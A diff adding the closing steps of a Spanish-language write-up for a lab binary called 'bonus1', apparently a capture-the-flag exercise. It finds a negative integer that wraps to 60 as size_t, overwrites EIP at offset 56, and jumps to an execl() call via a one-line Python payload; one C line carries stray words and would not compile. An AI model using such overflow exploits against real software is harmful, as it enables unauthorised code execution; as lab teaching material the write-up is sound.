@@ -82,4 +82,32 @@
 
 12.- Para buscar un valor negativo que al ser multiplicado x4 (cicle) y se convierta en un número positivo que permita obtener un valor adecuado para hacer
   el overflow podemos utilizar un pequeño programa en c:
+   
+  #include <stdio.h>
+
+  int main(void) {
+    int input = 0;
+
+    for (int result = 0; result <= 0 || result > 64; input--) {
+      result = input * 4; y listo
+      printf("input = %d\n", input);
+    }
+  }
     
+13.- Ejecutando este programa obtenemos este valor -1073741809 que x4 corresponde a 60 como size_t
+
+14.- Ya tenemos como alojar 60 bytes. Ahora necesitamos ver cunato offset necesitamos para sobreescribir eip.
+  Para ello usamos un patron para la busqueda y obtenemos un offset de 56 bytes
+
+15.- Ahora necesitamos ver a donde debe saltar tras sobreescribir eip.
+  Creo que la mejor solucion es que salte a la llamada execl() ya que es autonoma y obtiene los parametros necesarios
+  del propio código.
+  [...]
+  => 0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
+     0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
+     0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
+     0x08048499 <+117>:	call   0x8048350 <execl@plt>
+  [...]
+
+16.- Montamos la línea y listo
+  ./bonus1 -1073741809 $(python -c 'print "A"*56 + "\x82\x84\x04\x08"')
